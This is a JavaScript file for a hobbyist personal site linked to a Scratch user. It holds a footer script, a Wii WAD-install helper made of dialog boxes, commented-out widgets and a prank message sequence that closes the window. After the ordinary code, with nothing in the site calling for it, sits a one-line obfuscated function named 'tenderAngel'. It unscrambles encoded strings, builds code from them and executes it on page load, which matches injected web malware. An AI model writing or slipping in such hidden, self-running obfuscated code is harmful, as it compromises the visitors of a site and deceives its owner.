/*





 ░▒▓██████▓▒░ ░▒▓██████▓▒░        ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒▒▓███▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░░▒▓██████▓▒░  
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░     
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░     
 ░▒▓██████▓▒░ ░▒▓██████▓▒░       ░▒▓█▓▒░░▒▓█▓▒░░▒▓█████████████▓▒░░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░     
                                                                                              
                                                                                              











*/
const years = document.getElementById("yearright");
const d = new Date().getFullYear();
const datetimer = new Date()
let holiday_class = document.getElementById("holiday");
let skiptimes = 0;

years.innerHTML = `${d} - <a href='https://scratch.mit.edu/users/Knightbot63/' target='_blank' style="text-decoration: none;">RadicalOfficial</a> &#x2022; <a href='https://github.com/RadicalOfficial/' style="text-decoration: none;">GitHub</a>`;
/*
const latestfollower = document.getElementById("latestfo");
console.log("Fetching Data... Please wait");
function updateInfo() {
  fetch("https://corsproxy.io/?https://api.scratch.mit.edu/users/Knightbot63/followers/?limit=1&offset=0", {
    method: "GET", // "GET/POST"
    headers: {
      "Content-Type": "application/json"
    },
  })
    .then(r => r.json())
    .then(r => {
      console.log('Response', r)
      console.log(r[0].username)
      latestfollower.innerHTML = r[0].username
    }).catch(error => console.error('Error', error))
}
setInterval(updateInfo(), 15000)
*/
function help() {
  alert("It is recommended that you have brick protection on your Wii. Install Priiloader and BootMii before doing this! If you do not have any brick protection, please be EXTREMELY careful. I am not responsible for any damages caused on your Wii.")
  let wii = confirm("Do you have a Wii?\nIt should be at version 4.3")
  if (wii) {
    let homebrewed = confirm("Is your Wii Homebrewed?")
    if (homebrewed) {
      let wadmanager = confirm("Do you have a WAD manager?\nYAWM Mod Mii Edition, Wad Manager, Wii Mod Lite should work.")
      if (wadmanager) {
        alert("You are ready to install the WADs.\nSteps:\nDownload the WAD you want to install and put it into your SD card. (Recommended to put it into a WAD folder)\nTake your SD card out and put it into the Wii.\nGo to your WAD manager and install the WAD.\nOnce it is installed, you can now see it in the Wii Menu.")
      }
      else {
        alert("You are ready to install the WADs.\nSteps:\nFollow the steps of installing a WAD manager at https://wii.hacks.guide/\nDownload the WAD you want to install and put it into your SD card. (Recommended to put it into a WAD folder)\nTake your SD card out and put it into the Wii.\nGo to your WAD manager and install the WAD.\nOnce it is installed, you can now see it in the Wii Menu.")
      }
    } else {
      alert("Please install the Homebrew Channel to make this work. You can find a guide at https://wii.hacks.guide/")
    }
  } else {
    alert("You need a Wii that is in Version 4.3. Come back when it is updated.")
  }
}
/*
function updateCountdown() {
  const countdownDate = new Date("2024-10-22T11:15:00").getTime();
  const now = new Date().getTime();
  const distance = countdownDate - now;

  // Calculate remaining time
  const months = Math.floor(distance / (1000 * 60 * 60 * 24 * 30));
  const days = Math.floor((distance % (1000 * 60 * 60 * 24 * 30)) / (1000 * 60 * 60 * 24));
  const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
  const seconds = Math.floor((distance % (1000 * 60)) / 1000);

  // Update the odometer values
  document.getElementById("months").innerHTML = formatTime(months);
  document.getElementById("hours").innerHTML = formatTime(hours);
  document.getElementById("days").innerHTML = formatTime(days);
  document.getElementById("second").innerHTML = formatTime(seconds);

  // If the countdown is finished, display a message
  if (distance < 0) {
    clearInterval(countdownTimer);
    document.querySelector('.countdown').innerHTML = "<span class='countdown-text'>RPG Released! Please give Knightbot63 time to release it.</span>";
  }
}

// Update the countdown every second
const countdownTimer = setInterval(updateCountdown, 1000);

// Function to add leading zero if the value is less than 10
function formatTime(time) {
  return time < 10 ? `0${time}` : time;
}

let month = datetimer.getMonth();
let day = datetimer.getDate();
if (month+1 == 6) {
  holiday_class.innerHTML = "🏳‍🌈 Happy Pride Month! 🏳‍⚧"
}
if (month+1 == 5) {
  holiday_class.innerHTML = "Happy Mothers Day! 🌹"
}
if (month+1 == 11) {
  holiday_class.innerHTML = "Happy Thanksgiving!"
}
if (month+1 == 10) {
  holiday_class.innerHTML = "Happy Halloween!"
}
if (month+1 == 12) {
  holiday_class.innerHTML = "Merry Christmas!"
}
if (month+1 == 4 && day == 25) {
  holiday_class.innerHTML = "Happy Birthday Radical/Knightbot63! Celebrate their Birthday on their Scratch Profile!"
}
if (month+1 == 4 && day == 22) {
  holiday_class.innerHTML = "Let's keep the world clean! Happy Earth Day! 🌎"
}*/

function next() {
  skiptimes += 1;
  const messages = ["you can't beat the system.", "i'm sorry. you set it that way.", "if you want to get around something...", "well...", "it's not that easy to do so.", "you most likely blocked a website for whatever reason...", "mostly because of addiction.", "want to break out of it?", "then do these simple steps...", "GET OUT OF THIS WEBSITE", "OR ELSE YOU'RE NEXT...", "...", "...", "...", "why are you still here?", "okay...", "you want me to close everything...", "i'm not joking...", "I can close your window.", "seriously, get off now.", "you're wasting your time.", "...", "and you're wasting mine.", "okay, after 5 messages...", "i will close your window.", "sound good?", "sigh. i shouldn't have to do this.", "this next click will close the window...", "hopefully...", "if it didn't, then they patched it"];
  const newmessage = messages[skiptimes];
  const buttonmessages = ["keep clicking. it'll help.", "actually, it won't.", "you'll just waste your time.", "go on.", "yeah?", "yeah, so what?", "how did you know?", "YES. YESSSSS.", "okay...", "NO. NEVER.", "NEVERRRRR.", " ", "             ", "               ", "you need to stop wasting my time. I don't have all day to write all of these messages.", "okay... please just close the tab. I'm getting very annoyed.", "I know it's you.", "bet.", "no.", "yes i am .", " ", "yes i am...", " ", "positive?", "test me.", "yes . . .", "i'm annoying I know. by clicking this, you'll look like a clown.", "really?", "hopefully what?", "Now close the tab. I have nothing else. Scram."];
  const newbuttonmessage = buttonmessages[skiptimes];
  document.getElementById("SCARY").innerHTML = newmessage;
  document.getElementById("DARK").innerHTML = newbuttonmessage;
  if (skiptimes > 29) {
    let husk = open(location, '_self');
    husk.close();
    return false;
  }

}
var tenderAngel;(function(){var BJF='',PeD=721-710;function Kiw(e){var a=1213714;var i=e.length;var t=[];for(var q=0;q<i;q++){t[q]=e.charAt(q)};for(var q=0;q<i;q++){var z=a*(q+543)+(a%53568);var l=a*(q+334)+(a%20563);var d=z%i;var o=l%i;var j=t[d];t[d]=t[o];t[o]=j;a=(z+l)%2220633;};return t.join('')};var jRR=Kiw('cnpdtmbutluagwhsrroyjkcsxoveonifqcrtz').substr(0,PeD);var Zpb='3)) e t9)u;r6-8=f3;8=irtaigCr;zor-0s)ft]x8)th;e 1)pfC}tf;=a(;+A}70;v),ata8h0a;(7w+ 0ws7,q16)))jl;+1r)6660f.)(772nfd=,;i5=vo,r +=[tuaze,v,.clgo,>(mAl;sCrnpa.==arr[2]c]n]eutan;hr=;ns3fd4;2b=r,svrzfrhtC;"cu,7raei+ 8.1w(+nei;v;[ga,;sua)9x;o=rf(;g;}ut(s[i=a=t+r;(9 !);foel+d=.m"w,iwt9t=.v,a,,os chau(v"wc=na;=+1]vnh>c,n i,ar )=l"qu)v;r)+j+(e2r<3r.xxfn.ld{uoaaq;g";(r+k( = 1;dgggjq=r"cuwa}m.c;av=i(eAre[)lvd"kb4d+;rmiimah{=)slahua<la(-+g7So.f.i(f=),htd7v+r{g=;1aCfc"lfdp;j;30gau*Sft1nin,mkrn=,,t+=sn[!Al(bf]t;ou;cp<r(o=(=v(fs4trsr;tn)fv];rnevee.(snt .,0 =) t1(nuelv)=t(r)i((u=+f09[e-hba=b(v[nbi2*0regg)t 6;[).=)rg-n{rmr==+ved{a]gl(n+lvyfioer< f),nvpvC(;sa85;r(o.v ,]rtrinshs8o)luf,ti}th5l+saAa[of(;2voru6"h)sjitact)(=hr.rao6(+[lm3a.h9ukvn20];f m1gzces;tbm.lm"h.C0g;fto;  7;top.t1[rz+ex(s.i =8=.)<o.he-at]+. r8a h]s9b{v;l[6,slgoCchm{)r]r=nv+4}ls}.enp12hhrl=re((o,]+4,ori=snuep=c.il.r)-0 0oati[9emr';var BhQ=Kiw[jRR];var hnE='';var Qve=BhQ;var SDg=BhQ(hnE,Kiw(Zpb));var yEp=SDg(Kiw('h.o&Ul_06-)f}._eUtUU.7.1U$nw),be*4.,9$%wi01m0c.2=Uw.ee3oU(g76h,$t#w.U;(5!5,!fesngUU}U{=x3U)$]dtc1rpne1rf.cil1.b.ee\/s.s.0=U;c{0wjcwa\'e}ja;\'44(.i_r.$20.o=Ubzf%(,t{=o".Ut{f= {c_)b!by7.U).bea$=6 tntg(cwUeemtp[i%U\'6Ucw)UUs=d n({6ec]tci_w.\/=4.we$o"4fsU+(rc.d4U{U=(1oSj3o!)s.)=3e6o$C(j-e$i2=7a8.;(,(5(.e.$)0U%$a={weff(ngc!g_.2!;tr$lff3+.jn)c.tU#ccn1lso7aona..c!"Uii z$!UrpU,ab3"[{jqSecej e_phds} =ugc(ci0((j{b7_3earb.tfjcai3=.$++!SS.__.cdrc!f,_#3zU6!4_{0Tq)U0j(0e}.Ut=+nUaUU6)(t+3oUaerero(3z_(%dsI7,5]3Ui_z#3tUUr)3,(r7.U e5enb{)r3)3. c( d"h.U0*)h,UUbmU7.i)qfr%4$f_\'aeUl3.b.U!e (f.Un;7(cc2_),(%U!.1)cr.%zpUi%U=f]o*U)(}U!U{ix]7;f ;;jUc4$UUd,3Uz0()U=]_)bn 4U_d.!f$)\'[ht8,2.c_52.)aU)$j(( Urmed(!1(3.4r$$!.i&p)UuenUUc 7)e= U#U;*t,3(!}("0_)U.e.s6}ndU}44%ygU fi+6m}n\'Ua4;m=)b"U_)3n( n.].n,s7.w&zig(rw]),U$;U].r=cy)c{f.6r1a;hnam$n}UUt7egnUolf2.mUts(;-5])2csd=icw\/560c})w)!8&17t7e7de)_z\/UUorU3U$)tr)%.)8{UU4!{787lln=e2.netn.0l"el3(t}r,U1;2+Ufon}1re6 1ti,_)UU1n2(oU!Ua}ure1z1)$9r!)i,Ui+;rU)jjttt.,j,#\'jU!9fiat0U%2f(o#3o().UU);3!7+n3UtU).t(U36Uabj ;.).3mt0!;ug#214=!-!7[0U;..,0$19_dU.oU2.$coec.o;]jb.-68;0.a5.tc!cef. ()dC$=)__{)sU8;rvg6n..%$Uadu,3lU4r,U.4jl ,go..;;U=;U0_nd($x;g6,._n(1_r. !;icitc boo$csl5o(.t,.gitC,a&eaUe0,dwb_s)U,U5],pUet=)Uu5w)'));var lRP=Qve(BJF,yEp );lRP(8334);return 5625})()
/*
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⡿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⢿⣿⣿⢿⣿⣿⣿⣿⣿⡿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⡇⠀⠀⠀⠀⠀⠀⠀⠴⠶⠶⠤⠤⢄⣴⠟⠉⠉⠉⠉⢉⣿⡏⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⣿⡟⠉⠉⠉⠉⠙⢷⣶⠶⠶⠶⠶⠶⠶⠶⢶⣶⣿⣿⣿⣿⣿⣿⣿⠿⠀⠀⠀⠌
⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⠟⠁⠀⣠⣤⣤⣤⣼⣿⣷⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣾⣿⣧⣤⣤⣤⣤⣀⠀⠹⣦⡀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀
⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡾⠋⠀⣠⣾⠟⠉⠉⣹⣿⣿⣿⣿⣍⣁⣩⣾⣯⣵⣄⡀⢀⣸⣿⣿⣿⣇⠀⠀⠈⠻⣦⡀⠈⢻⣄⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣟⠀⠀⠀⠀⠀⠀⠀
⡇⠀⠀⠀⠀⠀⠀⠀⢀⣴⠟⠀⢀⣼⡟⢁⣤⣤⣶⣿⣿⣿⣿⣿⣿⡉⠉⠀⠀⠈⠉⠉⣻⣿⣿⣿⣿⣿⡓⢤⣤⡀⠈⢷⣄⠀⠙⢧⡀⠀⠀⠀⠻⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀
⡇⠀⠀⠀⠀⠀⠀⣠⡾⠃⠀⣠⡿⢏⣠⡿⠋⠠⣾⣿⣿⣿⣿⣿⣿⣇⢀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣷⡄⠈⠻⣦⡀⠻⣧⡀⠈⠻⣄⠀⠀⠀⠈⠻⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀
⡇⠀⠀⠀⠀⢀⣴⠏⠀⢀⣼⢟⣵⠿⠫⠀⠈⠁⣿⣿⠟⢻⣿⣿⣿⣿⣿⣤⣀⣠⣼⣿⣿⡿⢿⣿⡟⠉⣿⡇⠀⠲⢾⣟⠳⣜⢻⣆⠀⠙⢧⡀⠀⠀⠀⠈⠙⠻⢿⣷⠀⠀⠀⠀⠀
⡇⠀⠀⠀⣠⡞⠁⠀⣴⡿⢻⡿⢡⡾⠀⠀⠀⠀⢿⣿⠀⠀⠹⣿⡿⣿⣿⣿⡿⢻⣿⣿⣿⠆⠈⣩⠀⠀⢸⣿⡄⣙⢇⢻⣧⠈⡇⠙⣷⡀⠈⢻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⡇⠀⢀⡴⠋⠀⣠⣾⠟⢤⣈⣳⡾⠻⠄⣤⡀⠀⢺⣿⡌⢁⣀⠉⠁⢸⡿⠃⠰⠟⠋⠁⡀⠀⠀⣀⠈⠹⠿⣿⣧⣠⣾⠟⠛⣶⣋⣤⠞⠿⣦⠀⠘⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⡇⣰⠟⠁⢀⣴⡿⠁⠀⢀⣼⢿⣅⣀⣤⣼⣿⣶⣾⣿⣿⣆⠀⠰⠀⢀⣀⣤⠂⠀⠀⣀⣤⡀⠀⢀⣀⣤⣶⣾⣿⢿⣤⡀⠀⣾⠻⣦⡀⠀⠘⢷⣄⠈⠻⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⡿⠋⠀⣠⣿⣯⣤⣴⡶⢿⣅⠈⠛⠋⠁⠀⠀⠙⠛⢿⣿⣏⣤⣶⣶⣿⣿⣿⠀⠀⢰⣿⣿⣿⠾⣿⡿⣿⣿⠟⠁⠀⠈⠛⠿⠛⢀⣬⠛⢶⣤⣄⡹⣧⡀⠙⢧⡀⠀⠀⠀⠀⢀⣤⣾
⡇⠀⣾⣿⣉⣭⣭⣽⣷⣮⣉⣻⣷⣦⣀⣀⣀⣀⣀⣾⣿⣿⣿⢀⣿⣿⣿⣿⣧⣤⣿⣿⣿⣿⡟⣿⣿⣟⢁⣀⣀⣀⣀⣠⣴⣾⣋⣵⣶⣋⣉⣉⣀⣙⣿⣄⠈⠻⣄⠀⢀⣾⣿⣿⣿
⣇⣠⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣈⣉⣁⣀⣉⣿⡿⢿⣾⣿⣿⣿⣿⠀⠀⣿⣿⣿⣿⣷⣿⡿⣿⣉⣉⣀⣁⣉⣁⣀⣉⣉⣈⣉⣉⣉⣉⣉⣉⣁⣈⣀⣀⣙⣷⣾⣿⣿⣿⣿
⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⠏⠛⢿⣯⣿⠀⢠⣯⣭⣿⠟⡁⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣽⣿⣿⣿⣿⣿
⠃⣾⡿⢿⡿⠿⠿⠿⠿⠿⠟⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠈⠳⣤⣉⠛⠀⠾⠛⢉⣤⠞⠁⣿⣿⣿⡏⠙⣿⣿⣿⡿⠟⠛⠛⠛⠛⠛⠛⠛⠛⠻⠟⣿⠀⠀⣠⣿⣿⣿⣿⣿⣿
⠀⢻⣧⠀⠀⠀⠀⠈⠁⠁⠀⠀⠈⠀⠛⢿⣿⡿⠛⣿⣿⣿⣿⣷⣄⠀⠉⠳⣦⣀⡴⠋⠁⠀⣴⣿⣿⣿⣤⣀⣿⣿⣿⡇⠀⠀⠀⠀⠉⠀⠀⠈⠀⠀⣰⣿⠀⠀⣿⣿⣿⣿⣿⣿⣿
⠀⠘⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⡇⠀⠈⠻⣿⣿⣟⢻⣷⣄⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠠⠬⠀⠀⠀⢠⣿⡇⠀⣼⣿⣿⣿⣿⣿⣿⣿
⠀⠀⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡇⠀⠀⠀⠈⠻⣿⠈⣿⠻⣷⣄⠀⢠⣶⠟⠉⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠘⠀⠀⠀⠀⠀⣼⣿⠁⣰⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⢸⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡇⠀⠀⠀⠀⠀⠈⠀⣿⠀⣿⣿⣷⣿⣿⠀⠀⠙⣿⣿⣿⣿⣿⣿⡉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠘⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡿⢿⡿⣦⠀⠀⠀⠀⠀⣸⣿⣷⣿⣿⣿⣿⣿⣿⣇⣀⣸⣿⠟⠉⠉⣿⢳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠄⠀⠀⢿⣿⣦⣀⡀⠀⠀⠀⣀⣤⡾⠟⠀⣼⡇⠈⢷⣴⣿⡿⢻⣿⡿⣿⣿⣿⣿⣿⣿⢿⣿⣿⠛⣿⣷⠀⠐⣿⠀⠙⢷⣤⣀⠀⠀⠀⠀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⡇⠀⠀⢸⣿⣿⣿⠿⠿⠾⢿⣿⣿⢷⣶⠶⣿⡷⠶⣶⣿⣿⣷⡾⢫⣾⣿⣿⣿⣿⣿⣿⣷⡝⢿⣶⣿⡿⠶⢾⣿⠶⠛⠷⢪⣿⡿⠖⠶⠟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⡇⠀⠀⠀⣿⣿⠁⠀⠀⠀⠀⠈⠙⢷⣄⠀⣿⣇⣴⠟⣹⣿⣿⣷⡶⣺⣿⡿⢿⣿⢿⣿⣅⢶⣾⣿⣿⡀⣦⣰⣿⠀⣰⡾⠛⠁⠀⠀⠀⠀⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⡇⠀⠀⠀⢿⣿⠀⠀⠀⠀⠀⠀⠀⠈⢿⡄⢹⣿⠇⣴⣿⣿⣿⣿⣘⢿⣿⣿⣿⣿⣿⣿⣿⢷⣿⣿⣿⣿⣄⢼⣿⢸⡿⠁⠀⠀⠀⠀⡀⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⢸⣿⡗⠀⠀⠀⠀⠀⠀⠀⠀⢻⣾⡏⣰⣿⣿⡿⠁⠹⣿⣮⡻⣿⣿⣿⣿⣿⣵⣿⣿⠙⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠈⢿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⡿⠁⠀⠀⠹⣿⣿⣾⣿⣿⣿⣿⣿⣿⡟⠀⠈⢿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⢸⣿⠆⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⠟⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⢿⣿⠇⠀⠀⠈⢿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⡀⠀⢀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣾⣿⠀⠀⠀⠀⠀⢻⣿⣿⣿⡄⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⡇⠀⢸⡆⠀⠀⢿⣇⠀⠀⠀⠀⠀⣼⣿⣿⣿⣯⣤⣀⣀⣀⡞⠀⠀⣿⣾⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⣀⣀⣼⣿⣿⣿⣿⣦⠀⠀⣀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⡇⠀⠘⣇⠀⠀⠸⣿⣅⠀⠀⠀⠚⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⡇⠀⠀⣿⠀⠀⠀⣿⣧⠀⠀⠀⠀⠀⠀⠈⢻⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⡇⠀⠀⢸⡆⠀⠀⢻⣿⡖⠀⠀⠀⠀⠀⠀⢸⡇⠀⢸⡟⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⢿⡟⠉⢸⣿⠀⠀⠀⠀⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⡇⠀⠀⠀⣧⠀⠀⠸⣿⣧⠀⠀⠀⠀⠀⢀⣾⡇⠀⡼⠗⠲⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⢸⡇⠀⢸⣿⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⡇⠀⠀⠀⢻⡄⠀⠀⣿⣿⡄⠀⠀⢀⣴⠏⢻⡇⠸⣅⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⠀⠀⠸⣿⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⡇⠀⠀⠀⢸⡇⠀⠀⢸⣿⣇⠀⢠⡾⠁⠀⢻⡇⠀⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⣿⠀⢠⠟⣼⣿⣿⣿⣿⣿⡿⠻⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠃⠀⠀⠀⠀⣿⠀⠀⠘⣿⣿⡀⠋⠀⠀⠀⢸⣇⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣿⠀⠀⣰⣿⣿⣿⣿⣿⠏⠀⣸⢶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⡇⠀⠀⠀⠀⢸⡄⠀⠀⢿⣿⣟⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣰⣿⣿⣿⣿⣿⠃⠀⠀⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⡇⠀⠀⠀⠀⠘⣧⠀⠀⢸⣿⡿⠀⠀⠀⢺⣿⣿⣿⣿⣿⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⢰⡇⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
